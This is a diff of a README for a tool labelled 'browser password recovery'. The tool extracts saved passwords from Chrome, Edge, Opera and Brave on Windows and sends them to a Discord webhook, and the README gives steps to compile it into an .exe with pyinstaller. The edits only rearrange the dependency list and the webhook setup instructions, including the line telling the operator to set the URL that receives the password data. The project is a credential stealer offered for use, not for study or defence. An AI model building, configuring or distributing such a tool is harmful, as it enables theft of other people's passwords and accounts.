@@ -19,11 +19,7 @@ This tool helps you recover saved passwords from Chrome, Edge, Opera and Brave b
 - Windows operating system
 - Python 3.x (for compiling the `.exe`)
 - Browsers: Chrome, Brave, Edge, or Opera
-- Required Python libraries:
-  - `pycryptodomex`
-  - `pywin32`
-  - `requests`
-  - `pyinstaller`
+- Required Python libraries: `pycryptodomex`, `pywin32`, `requests`, `pyinstaller`
 
     ```bash
     pip install pycryptodomex pywin32 requests pyinstaller
@@ -31,18 +27,18 @@ This tool helps you recover saved passwords from Chrome, Edge, Opera and Brave b
 
   - A valid Discord webhook URL
 
+⚠️ Make sure to replace `discord_webhook_url` with your actual webhook URL where the password data will be sent.
+
 ### 🌐 Setting Up Your Webhook
 
-1. Create a Discord server (if you don’t have one).
-2. Go to **Server Settings > Integrations > Webhooks**
-3. Create a new webhook and **copy the URL**
-4. In `browser_password_recovery.py`, replace this line:
+- Create a Discord server (if you don’t have one).
+- Go to **Server Settings > Integrations > Webhooks**
+- Create a new webhook and **copy the URL**
+- In `browser_password_recovery.py`, replace this line:
 
 ```python
 WEBHOOK_URL = "discord_webhook_url"
 ```
-
-⚠️ Be sure to replace `discord_webhook_url` with your actual webhook URL where the password data will be sent.
 
 ### 🐍 Generate the Executable (.exe)
 
